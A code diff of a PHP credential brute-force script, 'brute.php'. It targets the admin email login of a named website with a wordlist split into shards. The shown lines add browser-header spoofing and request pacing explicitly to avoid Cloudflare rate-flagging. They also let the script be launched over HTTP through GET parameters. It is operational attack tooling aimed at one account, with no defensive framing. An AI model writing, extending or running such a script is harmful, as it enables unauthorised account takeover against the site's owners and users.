@@ -4,11 +4,13 @@
  * usage: php brute.php <shard> <nshards> <wordlist> <outfile> [base_url]
  * v2: adds browser headers + pacing to avoid Cloudflare rate-flagging.
  */
-$shard = (int)($argv[1] ?? 0);
-$nsh   = max(1, (int)($argv[2] ?? 1));
-$wl    = $argv[3] ?? '/tmp/wl.txt';
-$out   = $argv[4] ?? '/tmp/brute.out';
-$base  = $argv[5] ?? 'https://tukaryuk.com';
+// accept CLI args OR GET params (so it can be triggered over HTTP)
+$A = (isset($argv) && count($argv) > 1) ? $argv : array_merge([basename(__FILE__)], array_values($_GET));
+$shard = (int)($A[1] ?? 0);
+$nsh   = max(1, (int)($A[2] ?? 1));
+$wl    = $A[3] ?? '/tmp/wl.txt';
+$out   = $A[4] ?? '/tmp/brute.out';
+$base  = $A[5] ?? 'https://tukaryuk.com';
 $email = 'admin@tukaryuk.com';
 $DELAY = 600000; // 0.6s between requests -> ~1.5/s
 $UA    = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
